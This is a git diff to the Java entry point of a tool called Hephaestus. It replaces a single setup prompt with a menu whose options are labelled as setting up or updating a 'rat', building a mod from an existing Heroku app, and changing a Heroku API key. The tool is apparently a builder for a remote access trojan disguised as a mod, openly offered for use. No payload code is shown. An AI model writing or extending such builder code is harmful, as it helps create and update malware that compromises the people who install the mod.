@@ -1,5 +1,8 @@
 package studio.dreamys;
 
+import org.apache.commons.io.FileUtils;
+
+import java.io.File;
 import java.util.Scanner;
 
 public class Hephaestus {
@@ -16,10 +19,27 @@ public class Hephaestus {
                 "|__/  |__/ \\_______/| $$____/ |__/  |__/ \\_______/ \\_______/|_______/    \\___/   \\______/ |_______/ \n" +
                 "                    | $$                                                                            \n" +
                 "                    | $$                                                                            \n" +
-                "beta 2.0            |__/                 https://dsc.gg/dxxxxy                           dxxxxy#0776\n");
+                "release 2.0         |__/                 https://dsc.gg/dxxxxy                           dxxxxy#0776\n");
 
-        System.out.println("Press enter to continue...");
-        sc.nextLine();
-        Tasks.fullSetup();
+        System.out.println("Choose a task...");
+        System.out.println("0. Full setup (can re-use remote to update rat)");
+        System.out.println("1. Build mod from existing heroku app");
+        System.out.println("---Extra---");
+        System.out.println("2. Change heroku api key");
+        int task = sc.nextInt();
+        switch (task) {
+            case 0:
+                Tasks.fullSetup();
+                break;
+            case 1:
+                Tasks.modOnly();
+                break;
+            case 2:
+                FileUtils.deleteQuietly(new File(Tasks.path + "\\herokuapikey.hephaestus"));
+                Tasks.getHerokuAPIKey();
+                break;
+            default:
+                System.out.println("Invalid task");
+        }
     }
 }
